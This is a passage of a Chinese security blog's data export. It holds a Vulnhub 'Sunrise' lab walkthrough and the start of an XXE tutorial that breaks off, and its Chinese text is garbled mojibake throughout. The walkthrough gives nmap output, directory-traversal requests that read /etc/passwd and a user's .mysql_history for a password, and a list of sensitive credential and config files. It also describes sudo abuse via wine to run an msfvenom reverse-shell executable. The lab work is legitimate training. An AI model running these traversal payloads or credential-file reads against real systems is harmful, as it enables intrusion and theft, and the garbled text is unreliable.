å¤©é€›äº†ä¸€ä¸‹vulnhub,çœ‹åˆ°æ¯”è¾ƒé€‚åˆæ–°æ‰‹çš„é¶æœºã€‚å°±ä¸‹è½½ä¸‹æ¥ç©ç©ã€‚ å¯æ²¡æƒ³åˆ°ä¸€ä¸ªå‘ï¼Œå‘äº†æˆ‘ä¸¤å¤©åŠï¼Œå…±ç”¨è®¡ä¸¤å¤©åŠã€‚ æœ‰å¥è¯æˆ‘æƒ³è®²ä¸€ä¸‹ **************************!!! 0x01 Sunrise é¶æœºåœ°å€: https://download.vulnhub.com/sunset/sunrise.7z ä½œè€…: whitecr0wz éš¾åº¦: Beginner(æ–°æ‰‹) 0x01.1 ä¿¡æ¯æ”¶é›† nmap -n -T4 172.16.123.109 -A Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CST Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining) Nmap scan report for 172.16.123.109 Host is up (0.00011s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA) | 256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA) |_ 256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-ls: Volume / | SIZE TIME FILENAME | 612 2019-11-25 05:35 index.nginx-debian.html |_ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Index of / 3306/tcp open mysql? | fingerprint-strings: | NULL, RPCCheck: |_ Host '172.16.123.230' is not allowed to connect to this MariaDB server 8080/tcp open http-proxy Weborf (GNU/Linux) | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Page not found: Weborf (GNU/Linux) | Content-Length: 202 | Content-Type: text/html | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | GetRequest: | HTTP/1.1 200 | Server: Weborf (GNU/Linux) | Content-Length: 326 | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt; | &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 200 | Server: Weborf (GNU/Linux) | Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE | DAV: 1,2 | DAV: &lt;http://apache.org/dav/propset/fs/1&gt; | MS-Author-Via: DAV | Socks5: | HTTP/1.1 400 Bad request: Weborf (GNU/Linux) | Content-Length: 199 | Content-Type: text/html |_ &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | http-methods: |_ Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE |_http-server-header: Weborf (GNU/Linux) |_http-title: Weborf | http-webdav-scan: | Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE | WebDAV type: Apache DAV |_ Server Type: Weborf (GNU/Linux) 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(N SF:ULL,4D,&quot;I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20a SF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(RPCCheck SF:,4D,&quot;I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20allo SF:wed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(G SF:etRequest,187,&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r SF:\\nContent-Length:\\x20326\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C SF://DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt; SF:/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt; SF:&lt;tr\\x20style=\\&quot;background-color:\\x20#DFDFDF;\\&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\\x20href SF:=\\&quot;html/\\&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\\n&lt;/table&gt;&lt;p&gt;Generated\\x20by\\x2 SF:0Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,B2, SF:&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GE SF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDA SF:V:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\ SF:n\\r\\n&quot;)%r(RTSPRequest,B2,&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GN SF:U/Linux\\)\\r\\nAllow:\\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY, SF:MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\ SF:nMS-Author-Via:\\x20DAV\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,12B,&quot;HTTP/1\\.1\\x20 SF:404\\x20Page\\x20not\\x20found:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-Leng SF:th:\\x20202\\r\\nContent-Type:\\x20text/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PU SF:BLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;hea SF:d&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\\x20&lt;H1&gt;Error\\x20404&lt;/H1&gt;Page\\x20no SF:t\\x20found\\x20&lt;p&gt;Generated\\x20by\\x20Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p SF:&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,125,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20request:\\x20 SF:Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-Length:\\x20199\\r\\nContent-Type:\\x20t SF:ext/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x2 SF:04\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;b SF:ody&gt;\\x20&lt;H1&gt;Error\\x20400&lt;/H1&gt;Bad\\x20request\\x20&lt;p&gt;Generated\\x20by\\x20We SF:borf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(SIPOptions,B2,&quot;HTT SF:P/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GET,PO SF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\x SF:20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\n\\r\\ SF:n&quot;); MAC Address: 00:0C:29:22:ED:7F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 0.11 ms 172.16.123.109 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds å¼€æ”¾çš„ç«¯å£: â€‹ 22/tcp ssh openssh 7.9 â€‹ 80/tcp http apache â€‹ 3306/tcp mysql? â€‹ 8080/tcp http-proxy Weborf 80/tcp http æ²¡æœ‰ä»»ä½•ä¸œè¥¿ mysqlè¿ä¸ä¸Š çœ‹å‘ 8080ç«¯å£ çœ‹äº†çœ‹ç‰ˆæœ¬ ç”¨searchsploitæœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ¼æ´å­˜åœ¨ å­˜åœ¨ç›®å½•ç©¿æ¢­ çœ‹äº†çœ‹å…·ä½“payload: GET /..%2f..%2f..%2f..%2fetc%2fpasswd å°±æ˜¯æŠŠ / è½¬æˆ htmlç¼–ç  %2f æˆåŠŸã€‚ ç›®å½•ç©¿æ¢­æœ€ä¸»è¦çš„å°±æ˜¯æ‰¾ æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯. çœ‹çœ‹æœ‰æ²¡æœ‰æ•æ„Ÿæ–‡ä»¶å°¤å…¶æ˜¯ å†å²è®°å½•é‚£äº›ï¼Œé…ç½®æ–‡ä»¶ç­‰ GET /..%2f..%2f..%2fhome%2f homeä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·,ä¸¤ä¸ªç”¨æˆ·ä¸‹å­˜åœ¨çš„æ–‡ä»¶ï¼š sunrise |_user.txt weborf |_weborfæºç  æ³¨æ„ï¼è¿™é‡Œæ˜¯çŸ­è·¯çš„è·¯å£ï¼Œuser.txt æ˜¯ä¸€ä¸ªå‘ã€‚é‡ç‚¹ä¸åœ¨è¿™é‡Œ æƒ³åˆ°ç«¯å£å¼€æ”¾äº†mysqlï¼Œäºæ˜¯å°±ç™¾åº¦äº†ä¸€ä¸‹ mysqlçš„æ•æ„Ÿæ–‡ä»¶ /usr/local/app/apache2/conf/httpd.conf #apache2ç¼ºçœé…ç½®æ–‡ä»¶ /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #è™šæ‹Ÿç½‘ç«™è®¾ç½® /usr/local/app/php5/lib/php.ini #PHPç›¸å…³è®¾ç½® /etc/sysconfig/iptables #ä»ä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥ /etc/httpd/conf/httpd.conf #apacheé…ç½®æ–‡ä»¶ /etc/rsyncd.conf #åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶ /etc/my.cnf #mysqlçš„é…ç½®æ–‡ä»¶ /etc/redhat-release #ç³»ç»Ÿç‰ˆæœ¬ /etc/issue /etc/issue.net etc/passwd #å­˜å‚¨æ“ä½œç³»ç»Ÿç”¨æˆ·ä¿¡æ¯,è¯¥æ–‡ä»¶ä¸ºæ‰€æœ‰ç”¨æˆ·å¯è§ ç”¨æˆ·å: å¯†ç  : uid : gid :ç”¨æˆ·æè¿°ï¼šä¸»ç›®å½•ï¼šç™»é™†shell å¯†ç ï¼šxè¡¨ç¤ºæš—æ–‡,ç›¸åä¸ºæ˜æ–‡ uidï¼šuserid,â€0â€ä¸ºroot ID.1-99ä¸ºç³»ç»Ÿä¿ç•™,åˆ†é…ç»™ç³»ç»Ÿé¢„å®šä¹‰å¸å·ã€‚Linuxç”¨æˆ·å¯ä»¥åˆ†ä¸º3ç±»ï¼šè¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰ã€ç®¡ç†ç”¨æˆ·å’Œæ™®é€šç”¨æˆ· ä¼ªç”¨æˆ·ï¼ˆpsuedo usersï¼‰ bin #æ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶ sys #æ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶ adm #æ‹¥æœ‰è´¦æˆ·æ–‡ä»¶ uucp #UUCPä½¿ç”¨ Ip #Ipæˆ–lpdå­ç³»ç»Ÿä½¿ç”¨ nobody #NFSä½¿ç”¨ audit cron mail usenet gid:å­—æ®µè®°å½•çš„æ˜¯ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚å¯¹åº”ç€/etc/groupæ–‡ä»¶ä¸­çš„ä¸€æ¡è®°å½• ç”¨æˆ·æè¿°ï¼šå­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µï¼Œä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ ä¸»ç›®å½•ï¼šç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½• ç™»é™†shellï¼š å¸¸ç”¨shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell) /bin/sh #é»˜è®¤ç™»å½•Shell /sbin/nologin #ä»£è¡¨ç”¨æˆ·ä¸èƒ½ç™»å½• /etc/shadow username: passwd: lastchg: min: max: warn: inactive: expire: flag ç™»å½•å:åŠ å¯†å£ä»¤:æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´:æœ€å°æ—¶é—´é—´éš”:æœ€å¤§æ—¶é—´é—´éš”:è­¦å‘Šæ—¶é—´:ä¸æ´»åŠ¨æ—¶é—´:å¤±æ•ˆæ—¶é—´:æ ‡å¿— å£ä»¤ - åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ï¼Œ13ä¸ªå­—ç¬¦ï¼›å¦‚æœä¸ºç©º/ç”¨æˆ·æ²¡æœ‰å£ä»¤ï¼›å¦‚å«æœ‰ä¸å±äºé›†åˆ{./0-9A-Za-z}ä¸­çš„å­—ç¬¦/ç”¨æˆ·ä¸èƒ½ç™»å½• æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ - è¡¨ç¤ºçš„æ˜¯ä»æŸä¸ªæ—¶åˆ»èµ·ï¼Œåˆ°ç”¨æˆ·æœ€åä¸€æ¬¡ä¿®æ”¹å£ä»¤æ—¶çš„å¤©æ•°ã€‚æ—¶é—´èµ·ç‚¹å¯¹ä¸åŒçš„ç³»ç»Ÿå¯èƒ½ä¸åŒ æœ€å°æ—¶é—´é—´éš” - ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´æ‰€éœ€çš„æœ€å°å¤©æ•° æœ€å¤§æ—¶é—´é—´éš” - å£ä»¤ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•° è­¦å‘Šæ—¶é—´ - ä»ç³»ç»Ÿå¼€å§‹è­¦å‘Šç”¨æˆ·åˆ°ç”¨æˆ·å¯†ç æ­£å¼å¤±æ•ˆä¹‹é—´çš„å¤©æ•° ä¸æ´»åŠ¨æ—¶é—´ - ç”¨æˆ·æ²¡æœ‰ç™»å½•æ´»åŠ¨ä½†è´¦å·ä»èƒ½ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•° å¤±æ•ˆæ—¶é—´ - è´¦å·çš„ç”Ÿå­˜æœŸã€‚ ä¿ç•™æ¡ç›® - æ— ç”¨å­—æ®µ /etc/group å­˜å‚¨æœ‰å…³æœ¬åœ°ç”¨æˆ·ç»„çš„ä¿¡æ¯ ä¸€ä¸ªç»„ä¸­å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æˆ·ä¹Ÿå¯ä»¥å±äºä¸åŒçš„ç»„ã€‚å½“ä¸€ä¸ªç”¨æˆ·åŒæ—¶æ˜¯å¤šä¸ªç»„ä¸­çš„æˆå‘˜æ—¶ï¼Œåœ¨/etc/passwdæ–‡ä»¶ä¸­è®°å½•çš„æ˜¯ç™»å½•æ—¶æ‰€å±çš„é»˜è®¤ç»„ ç”¨æˆ·è¦è®¿é—®å±äºé™„åŠ ç»„çš„æ–‡ä»¶æ—¶ï¼Œå¿…é¡»é¦–å…ˆä½¿ç”¨newgrpå‘½ä»¤ä½¿è‡ªå·±æˆä¸ºæ‰€è¦è®¿é—®çš„ç»„ä¸­çš„æˆå‘˜ 1ï¼‰groupname GID #ç»„å 2ï¼‰password #å¯†ç ä½ç½® 3ï¼‰GID #ç»„ID 4ï¼‰user #ç»„æˆå‘˜ /usr/local/app/php5/lib/php.ini #PHPç›¸å…³è®¾ç½® /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #è™šæ‹Ÿç½‘ç«™è®¾ç½® /etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf/httpd.conf #linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ /usr/local/resin-3.0.22/conf/resin.conf #3.0.22çš„RESINé…ç½®æ–‡ä»¶ /usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHEè™šæ‹Ÿä¸»æœº /etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf /httpd.conf #linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ /usr/local/resin-3.0.22/conf/resin.conf #3.0.22çš„RESINé…ç½®æ–‡ä»¶ /usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHEè™šæ‹Ÿä¸»æœº /etc/sysconfig/iptables #æŸ¥çœ‹é˜²ç«å¢™ç­–ç•¥ /root/.mysql_historyã€/root/.bash_history #Mysqlè´¦å·å¯†ç ä¿¡æ¯ æœ€åä¸€ä¸ª**.mysql_history** #mysqlè´¦å·å¯†ç ä¿¡æ¯ è¿™é‡Œå†™çš„æ˜¯/root/ç”¨æˆ·ï¼Œå°±çŒœæƒ³æ˜¯å¦å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·é‡Œé¢ GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history æ‰¾åˆ° weborf ç”¨æˆ·çš„å¯†ç ã€‚ ä½¿ç”¨sshç™»å…¥ä¸Šå» ç™»å…¥æˆåŠŸï¼ï¼ï¼ åˆ°è¿™ä¸€æ­¥å°±å¯ä»¥å¼€å§‹æ¸—é€ææƒäº† 0x01.2 ææƒ å‘ç°ç”¨æˆ·çš„ç­‰çº§ä¸æ˜¯å¾ˆé«˜ã€‚æ‰“ç®—æ¥ææƒä¸€ä¸‹ æƒ³åˆ°ä¹‹å‰çš„mysqlæœ‰åŠå¼€æ”¾çš„çŠ¶æ€ã€‚äºæ˜¯æœ‰ä¸ªçŒœæƒ³ã€‚ æ˜¯ä¸æ˜¯åªå…è®¸æœ¬åœ°ç™»å…¥mysqlï¼Œæµ‹è¯•äº†ä¸€ä¸‹ ç™»å…¥æˆåŠŸï¼ æŸ¥è¯¢äº†ä¸€ç•ªæ•°æ®åº“å‘ç°å­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ã€‚ ç°åœ¨å¾—åˆ°äº† å¦ä¸€ä¸ªç”¨æˆ·çš„ å¯†ç ã€‚ ç°åœ¨åˆ‡æ¢ç”¨æˆ· å‘ç°æƒé™ä¹Ÿä¸æ˜¯ç‰¹åˆ«é«˜ã€‚ä¸è¿‡ç®—æ˜¯è¿›å…¥äº†æ­£å¸¸çš„ç”¨æˆ·äº†ã€‚ å¼€å§‹ææƒ sudo su æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸è¡Œ åœ¨ç™¾æ€ä¸å¾—å…¶è§£çš„æ—¶å€™ã€‚å»é—®äº†é—®ä¸€äº›å¤§ä½¬ã€‚ æœ‰ä¸ªå¤§ä½¬è·Ÿæˆ‘è¯´çœ‹çœ‹æœ‰æ²¡æœ‰ wineï¼Œå¯ä»¥ç”¨wine å»ºç«‹åå‘è¿æ¥ã€‚å†ç”¨sudo -l æŸ¥ä¸€ä¸‹è¯¥ç”¨æˆ·æœ‰é‚£äº›æƒé™ å­˜åœ¨ã€‚ sudo -l #æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™ scp ä¼ äº†ä¸‹msfveom windows åå‘è¿æ¥ scp muma.exe sunrise@172.16.123.109:/home/sunrise/muma.exe å¼€å§‹åå¼¹ã€‚ 0x01.3 æŸ¥çœ‹flag è¯•è¯•æ˜¯å¦èƒ½ç›´æ¥è¯»å–root.txt cat /root/root.txt æˆåŠŸï¼","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://hu5k7.github.io/categories/vulnhub/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://hu5k7.github.io/tags/vulnhub/"}]},{"title":"XXEæ¼æ´å­¦ä¹ ","slug":"xxe","date":"2019-12-03T09:23:08.000Z","updated":"2020-07-10T06:35:20.016Z","comments":true,"path":"2019/12/03/xxe/","link":"","permalink":"https://hu5k7.github.io/2019/12/03/xxe/","excerpt":"0x00 å‰è¨€ æœ€è¿‘çœ‹åˆ°æŒºå¤šXXEæ¼æ´çš„ï¼Œäºæ˜¯æ‰“ç®—æ¥æµ…å…¥å­¦ä¹ ä¸‹ã€‚","text":"0x00 å‰è¨€ æœ€è¿‘çœ‹åˆ°æŒºå¤šXXEæ¼æ´çš„ï¼Œäºæ˜¯æ‰“ç®—æ¥æµ…å…¥å­¦ä¹ ä¸‹ã€‚ 0x01æ¼æ´äº§ç”Ÿ XXEæ¼æ´å…¨ç§°XML External Entity Injection å³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ã€‚ XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚ 0x01.1 XMLåŸºç¡€ è¦äº†è§£XXEæ¼æ´ï¼Œå…ˆè¦ææ‡‚ä¸€å®šçš„åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£XMLæ–‡æ¡£çš„åŸºç¡€ç»„æˆã€‚ XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆExtensible Markup Languageï¼‰ XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚ HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ® XMLæŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼ŒXMLæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚ XMLè¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œå…è®¸ä½œè€…å®šä¹‰è‡ªå·±çš„æ ‡ç­¾å’Œè‡ªå·±çš„æ–‡æ¡£ç»“æ„ XMLçš„è¯­æ³•è§„åˆ™ï¼š XMLæ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´  XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾ XMLæ ‡ç­¾å¯¹å¤§å°æ•æ„Ÿ XMLå…ƒç´ å¿…é¡»è¢«æ­£ç¡®çš„åµŒå¥— XMLå±æ€§å€¼å¿…é¡»åŠ å¼•å¯¼ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!--XML å£°æ˜--&gt; &lt;girl age=&quot;18&quot;&gt; &lt;!--è‡ªå®šçš„æ ¹å…ƒç´ girl;ageå±æ€§éœ€è¦åŠ å¼•å¯¼--&gt; &lt;hair&gt;é•¿å¤´å‘&lt;/hair&gt; &lt;!--è‡ªå®šä¹‰çš„4ä¸ªå­å…ƒç´ ï¼Œå³girlå¯¹è±¡çš„å±æ€§--&gt; &lt;eye&gt;å¤§çœ¼ç›&lt;/eye&gt; &lt;face&gt;å¯çˆ±çš„è„¸åº&lt;/face&gt; &lt;summary&gt;å¯çˆ±ç¾ä¸½çš„å¥³å­©&lt;/summary&gt; &lt;/girl&gt; &lt;!--æ ¹å…ƒç´ çš„é—­åˆ--&gt; å®ä½“å¼•ç”¨ åœ¨XMLä¸­ï¼Œä¸€äº›å­—ç¬¦æ‹¥æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚ å¦‚æœæŠŠå­—ç¬¦&quot;&lt;&quot;æ”¾åœ¨XMLå…ƒç´ ä¸­ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè§£é‡Šå™¨ä¼šæŠŠå®ƒä½œä¸ºæ–°å…ƒç´ çš„å¼€å§‹ã€‚ ä¾‹å­: &lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; ä¸ºäº†é¿å…è¿™ä¸ªé”™è¯¯ï¼Œè¯·ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿ â€œ&lt;â€ å­—ç¬¦ï¼š &lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; åœ¨ XML ä¸­ï¼Œæœ‰ 5 ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼š &amp;lt &lt; å°äºå· &amp;gt &gt; å¤§äºå· &amp;amp &amp; å’Œå· &amp;apos â€™ å•å¼•å· &amp;quot &quot; å¼•å· DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å— DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ &lt;!--XMLå£°æ˜--&gt; &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt; &lt;!DOCTYPE note [ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--å®šä¹‰bodyå…ƒç´ 